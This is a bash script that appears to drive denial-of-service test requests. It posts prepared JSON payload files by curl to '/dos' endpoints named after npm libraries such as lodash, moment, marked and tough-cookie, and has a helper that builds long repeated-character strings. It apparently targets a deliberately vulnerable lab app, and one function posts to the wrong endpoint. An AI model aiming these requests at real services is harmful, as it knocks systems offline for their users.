#!/bin/bash
set +x

generate() {
    # echo "Running generation... Hold tight." > /dev/null
    # start=`date +%s`

    LENGTH=$1
    CHAR=$2
    RESULT=""
    for ((i = 0; i <= $LENGTH; i++))
    do
        RESULT=$RESULT$CHAR
    done

    # end=`date +%s`
    # runtime=$((end-start))
    # echo "All done!" > /dev/null
    # echo "Took: ${runtime}s" > /dev/null
    echo $RESULT
}

makeJson() {
    STR=$1
    jo -p title=$STR > @../data.json
}

runAjvDos() {
    curl -d "@./data/ajvdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/ajv/dos
}

runCharsetDos() {
    curl -d "@./data/charsetdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/charset/dos
}

runContentTypeParserDos() {
    curl -d "@./data/contenttypeparserdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/content-type-parser/dos
}

runContentDos() {
    curl -d "@./data/contentdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/content/dos
}

runDebugDos() {
    curl -d "@./data/debugdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/debug/dos
}

runDnsSyncDos() {
    curl -d "@./data/dnssyncdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/dns-sync/dos
}

runForwardedDos() {
    curl -d "@./data/forwardeddosdata.json" -H "Content-Type: application/json" -X POST ${URL}/dns-sync/dos
}

runFreshDos() {
    curl -d "@./data/freshdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/fresh/dos
}

runHtmlParserDos() {
    curl -d "@./data/htmlparserdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/htmlparser/dos
}

runIsMobileJsDos() {
    curl -d "@./data/ismobilejsdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/ismobilejs/dos
}

runLodashDos() {
    echo "Attempting POST request"
    start=`date +%s`
    curl -d "@./data/lodashdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/lodash/dos
    echo ""
    echo "POST request complete: "
    end=`date +%s`
    runtime=$((end-start))
    echo "Took: ${runtime}s" 
}

runMimeDos(){
    curl -d "@./data/mimedosdata.json" -H "Content-Type: application/json" -X POST ${URL}/mime/dos
}

runMobileDetectDos(){
    curl -d "@./data/mobiledetectdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/mobile_detect/dos
}

runMomentDos(){
    curl -d "@./data/momentdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/moment/dos
}

runNoCaseDos(){
    curl -d "@./data/nocasedosdata.json" -H "Content-Type: application/json" -X POST ${URL}/no_case/dos
}

runParsejsonDos(){
    curl -d "@./data/parsejsondosdata.json" -H "Content-Type: application/json" -X POST ${URL}/parsejson/dos
}

runPlatformDos(){
    curl -d "@./data/platformdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/platform/dos
}

runSlugDos(){
    curl -d "@./data/slugdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/slug/dos
}

runStringDos(){
    curl -d "@./data/stringdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/string/dos
}

runToughCookieDos(){
    curl -d "@./data/toughcookiedosdata.json" -H "Content-Type: application/json" -X POST ${URL}/tough_cookie/dos
}

runTimespanDos(){
    curl -d "@./data/timespandosdata.json" -H "Content-Type: application/json" -X POST ${URL}/timespan/dos
}

runUnderscoreStringDos(){
    curl -d "@./data/underscorestringdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/underscore_string/dos
}
#how do I generate multiple text?
runMarkedDos() {
    curl -d "@./data/markeddosdata.json" -H "Content-Type: application/json" -X POST ${URL}/marked/dos
}
